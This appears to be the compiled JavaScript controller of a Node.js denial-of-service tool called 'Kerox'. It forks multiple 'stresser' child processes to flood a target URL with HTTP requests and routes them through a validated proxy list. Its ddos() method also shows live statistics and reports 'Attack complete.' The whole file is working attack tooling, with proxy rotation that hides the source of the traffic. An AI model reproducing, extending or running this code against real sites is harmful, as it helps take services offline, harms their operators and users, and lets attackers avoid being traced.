"use strict";
var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || function (mod) {
    if (mod && mod.__esModule) return mod;
    var result = {};
    if (mod != null) for (var k in mod) if (k !== "default" && Object.prototype.hasOwnProperty.call(mod, k)) __createBinding(result, mod, k);
    __setModuleDefault(result, mod);
    return result;
};
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.Kerox = void 0;
const child_process_1 = require("child_process");
const path_1 = __importDefault(require("path"));
const http = __importStar(require("http"));
const fs_1 = __importDefault(require("fs"));
require("overpaint.js");
const Utils_1 = require("../utils/Utils");
const PacketType_1 = require("../enums/PacketType");
const Status_1 = require("../enums/Status");
const Status_2 = require("../enums/Status");
const Packet_1 = require("../types/Packet");
const Stats_1 = require("./Stats");
const LogType_1 = require("../enums/LogType");
const Log_1 = require("../types/Log");
const LogManager_1 = require("./LogManager");
const ProgressBar_1 = require("./ProgressBar");
const events_1 = __importDefault(require("events"));
class Kerox extends events_1.default {
    emit(event, ...args) { return super.emit(event, ...args); }
    on(event, listener) { return super.on(event, listener); }
    once(event, listener) { return super.once(event, listener); }
    off(event, listener) { return super.off(event, listener); }
    set _status(value) {
        var _a, _b;
        this.status = (_a = value[0]) !== null && _a !== void 0 ? _a : Status_1.Status.Unknown;
        this.info = (_b = value[1]) !== null && _b !== void 0 ? _b : Status_2.Info.Unknown;
        if (this.status === Status_1.Status.Idle)
            this.emit('idle');
    }
    // ===== Constructor =====
    constructor(options) {
        super();
        // ===== Status =====
        this.status = Status_1.Status.Unknown;
        this.info = Status_2.Info.Unknown;
        // ===== Logs =====
        this.logs = new LogManager_1.LogManager();
        // ===== Stressers =====
        this.stressers = new Map();
        this.stresserStats = new Map();
        // ===== Proxies =====
        this.proxies = [];
        // ===== Agents =====
        this.httpAgent = new http.Agent();
        // ===== Statistics =====
        this.stats = new Stats_1.Stats();
        this.progressBar = new ProgressBar_1.ProgressBar(26);
        this.options = {
            updateInterval: 1000,
            refreshRate: 5,
            useProxies: false,
            validateProxies: true,
            proxyFilePath: undefined,
        };
        if (typeof options === 'object') {
            Object.assign(this.options, options);
        }
        this.renderTerminal(this.options.refreshRate);
        this.initialize();
    }
    // ========== Initialization =====================================================================
    crash(message = 'An error occurred.') {
        this.logs._info(message._Red);
        this.logs._info('Stopping Kerox...'._Red._bold);
        setTimeout(process.exit, 1000);
    }
    initialize() {
        return __awaiter(this, void 0, void 0, function* () {
            this.stats.disable();
            if (this.options.useProxies) {
                if (!this.options.proxyFilePath) {
                    return this.crash('Proxy file path is missing.');
                }
                else if (!fs_1.default.existsSync(path_1.default.resolve(this.options.proxyFilePath))) {
                    return this.crash('Proxy file not found.');
                }
                else {
                    this.proxies = (0, Utils_1.parseProxies)(fs_1.default.readFileSync(path_1.default.resolve(this.options.proxyFilePath), 'utf8').split('\n'));
                    if (this.options.validateProxies)
                        yield this.validateProxies();
                    this._status = [Status_1.Status.Idle, Status_2.Info.Unknown];
                }
            }
            else {
                this._status = [Status_1.Status.Idle, Status_2.Info.Unknown];
            }
        });
    }
    stopStressers() {
        this.stressers.forEach(stresser => stresser.kill());
        this.stressers.clear();
        delete this.ddosOptions;
    }
    // ========== Stats ================================================================================
    resetStats() {
        this.stats = new Stats_1.Stats();
        this.stresserStats.clear();
    }
    updateStats() {
        if (this.stats._disabled)
            return;
        this.stats.reset();
        this.stresserStats.forEach((stats) => {
            if (!stats)
                return;
            this.stats.combine(stats);
        });
        if (this.ddosOptions)
            this.progressBar.update(this.stats.age / 1000 / this.ddosOptions.duration);
    }
    // ========== Rendering | Logs =====================================================================
    renderFrame() {
        var _a, _b, _c;
        this.updateStats();
        this.logs.update();
        console.clear();
        console.log(Kerox.header + '\n');
        if (this.info === Status_2.Info.Stressing) {
            if ((_a = this.ddosOptions) === null || _a === void 0 ? void 0 : _a.display.progressBar)
                console.log(this.progressBar.bar + '\n');
            if ((_b = this.ddosOptions) === null || _b === void 0 ? void 0 : _b.display.statistics)
                console.log(this.statsPanel(this.stats) + '\n');
            if ((_c = this.ddosOptions) === null || _c === void 0 ? void 0 : _c.display.httpCodes)
                console.log(this.httpCodesPanel(this.stats.codes) + '\n');
        }
        this.logs.print(LogType_1.LogType.Stats);
        this.logs.print(LogType_1.LogType.Info);
    }
    renderTerminal(fps = 10) {
        this.renderFrame();
        setInterval(() => this.renderFrame(), 1000 / fps);
    }
    createField(label, data, ...styles) {
        let field = `${label}:`.padEnd(11) + `${data}`.padStart(15);
        for (let style of styles)
            field = field[`_${style}`];
        return field;
    }
    createPannel(fields) {
        let pannel = '';
        for (let [label, data, ...styles] of fields) {
            let field = this.createField(label, data, ...styles);
            pannel += field + '\n';
        }
        return pannel.trimEnd();
    }
    statsPanel(stats) {
        return this.createPannel([
            ['Duration', stats.duration, 'Gray'],
            ['Speed', stats.speed, 'Gray'],
            ['Requests', stats.requests, 'White'],
            ['Pending', stats.pending, 'OrangeGold'],
            ['Success', stats.success, 'GreenApple'],
            ['Fails', stats.fails, 'Orange'],
            ['Errors', stats.errors, 'Red'],
            ['Dropped', stats.dropped, 'Gray'],
        ]);
    }
    httpCodesPanel(codes) {
        return this.createPannel([
            ['1XX', codes._1XX, 'Gray'],
            ['2XX', codes._2XX, 'Gray'],
            ['3XX', codes._3XX, 'Gray'],
            ['4XX', codes._4XX, 'Gray'],
            ['5XX', codes._5XX, 'Gray'],
        ]);
    }
    // ========== Proxies ===============================================================================
    /**
     * Starts a stresser to validate the proxies and keep only the working ones.
     */
    validateProxies() {
        return __awaiter(this, arguments, void 0, function* (timeout = 5000) {
            return new Promise((resolve, reject) => {
                if (!this.options.validateProxies) {
                    this.logs._info('Skipping proxy validation.'._dim);
                    return resolve();
                }
                // set status
                this._status = [Status_1.Status.Busy, Status_2.Info.ValidatingProxies];
                this.resetStats();
                // validate proxies
                let validator = this.spawn({
                    updateInterval: this.options.updateInterval,
                    target: 'https://example.com',
                    useProxies: true,
                    proxies: this.proxies,
                    multiplier: 1,
                    maxPending: 1,
                    agent: undefined,
                    dropRequests: false,
                });
                // listen for validation completion
                validator === null || validator === void 0 ? void 0 : validator.on('message', (packet) => {
                    if (packet.type === PacketType_1.PacketType.ValidationCompleted) {
                        const validProxies = packet.data;
                        if (validProxies && validProxies.length > 0) {
                            this.logs._info(`Found ${validProxies.length} valid proxies`);
                            this.proxies = validProxies;
                            this._status = [Status_1.Status.Idle, Status_2.Info.Unknown];
                            return resolve();
                        }
                        else {
                            return this.crash('No valid proxies found.');
                        }
                    }
                });
                // start proxy validation
                let packet = (0, Packet_1.Packet)(PacketType_1.PacketType.ValidateProxies, {
                    proxies: this.proxies,
                    timeout: timeout
                });
                validator.send(packet);
            });
        });
    }
    // ========== Stressers =============================================================================
    /**
     * Starts a stresser sub-process.
     * @param options Configuration options for the stresser
     */
    spawn(options) {
        const stresser = (0, child_process_1.fork)(path_1.default.join(__dirname, '..', 'exec', 'Spawn.js'), []);
        this.stressers.set(stresser.pid, stresser);
        stresser.on('message', (packet) => {
            if (typeof packet !== 'object')
                return;
            switch (packet.type) {
                case PacketType_1.PacketType.Spawned:
                    this.logs._info(`Spawned Kerox (pid: ${stresser.pid})`._GreenApple._dim, 5000);
                    break;
                case PacketType_1.PacketType.Done:
                    this.kill(stresser.pid, false);
                    break;
                case PacketType_1.PacketType.Data:
                    this.stresserStats.set(stresser.pid, packet.data);
                    break;
                case PacketType_1.PacketType.Log:
                    this.logs.push(packet.data);
                    break;
                case PacketType_1.PacketType.Error:
                    this.logs.push((0, Log_1.Log)(LogType_1.LogType.Info, packet.data));
                    this.renderFrame();
                    process.exit(1);
                    break;
            }
        });
        stresser.send((0, Packet_1.Packet)(PacketType_1.PacketType.Init, Object.assign(Object.assign({}, this.options), options)));
        return stresser;
    }
    /**
     * Kills a stresser sub-process.
     * @param pid The process id of the stresser to kill
     */
    kill(pid, deleteStats) {
        const stresser = this.stressers.get(pid);
        if (!stresser)
            return;
        stresser.kill();
        this.stressers.delete(stresser.pid);
        if (deleteStats)
            this.stresserStats.delete(stresser.pid);
        this.logs._info(`Killed Kerox (pid: ${stresser.pid})`._Red._dim, 5000);
    }
    // ========== DDoS ==================================================================================
    /**
     * Starts stressing a target url with a single stresser
     * @param target The target url
     */
    ddos(options) {
        if (this.status === Status_1.Status.Busy)
            return this.crash(`Kerox is ${this.status}. ${this.info}`);
        this._status = [Status_1.Status.Busy, Status_2.Info.Stressing];
        this.stopStressers();
        this.ddosOptions = options;
        const onSpawned = () => {
            this.resetStats();
            this.stressers.forEach(stresser => stresser.send((0, Packet_1.Packet)(PacketType_1.PacketType.Stress, options.duration)));
        };
        const onCompleted = () => {
            var _a;
            this._status = [Status_1.Status.Idle, Status_2.Info.Unknown];
            this.logs._info('Attack complete.'._GreenApple._bold);
            this.logs._stats(this.statsPanel(this.stats) + '\n');
            if ((_a = this.ddosOptions) === null || _a === void 0 ? void 0 : _a.display.httpCodes)
                this.logs._stats(this.httpCodesPanel(this.stats.codes) + '\n');
            this.stopStressers();
            this.stats.disable();
        };
        // spawn stressers
        let spawned = 0;
        let completed = 0;
        for (let i = 0; i < options.childProcesses; i++) {
            const stresser = this.spawn({
                updateInterval: this.options.updateInterval,
                target: options.target,
                useProxies: this.options.useProxies,
                proxies: this.proxies,
                multiplier: options.multiplier,
                maxPending: Math.floor(options.maxPending / options.childProcesses),
                agent: options.agent,
                dropRequests: options.dropRequests,
            });
            // wait for completed
            stresser.on('message', (packet) => {
                switch (packet.type) {
                    case PacketType_1.PacketType.Spawned:
                        spawned++;
                        if (spawned === options.childProcesses)
                            onSpawned();
                        break;
                    case PacketType_1.PacketType.Done:
                        completed++;
                        if (completed === options.childProcesses)
                            onCompleted();
                        break;
                }
            });
        }
    }
}
exports.Kerox = Kerox;
// ===== Static =====
Kerox.header = `\r  _  __                  
       \r | |/ /
       \r | ' / ___ _ __ _____  __
       \r |  < / _ \\ '__/ _ \\ \\/ /
       \r | . \\  __/ | | (_) >  <
       \r |_|\\_\\___|_|  \\___/_/\\_\\`._RebeccaPurple;
//# sourceMappingURL=Kerox.js.map